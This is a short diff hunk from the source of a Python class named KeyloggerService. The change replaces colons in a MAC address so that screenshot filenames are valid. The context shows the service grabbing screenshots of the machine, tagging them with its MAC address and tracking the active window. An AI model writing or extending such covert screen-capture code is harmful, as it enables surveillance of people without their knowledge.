@@ -50,7 +50,7 @@ class KeyloggerService:
                 print('take a shot')
                 snapshot = ImageGrab.grab()
                 # save_path = rf"C:\Users\User\Desktop\DATE={time.strftime('%d-%m-%Y')}TIME={time.strftime('%H-%M-%S')}.jpg"
-                save_path = rf"C:\Users\Public\MAC={get_mac_address()}DATE={time.strftime('%d-%m-%Y')}TIME={time.strftime('%H-%M-%S')}.jpg"
+                save_path = rf"C:\Users\Public\MAC={get_mac_address().replace(':','-')}DATE={time.strftime('%d-%m-%Y')}TIME={time.strftime('%H-%M-%S')}.jpg"
                 snapshot.save(save_path)
                 os.remove(save_path)
                 self.__prev_window = self.__current_window
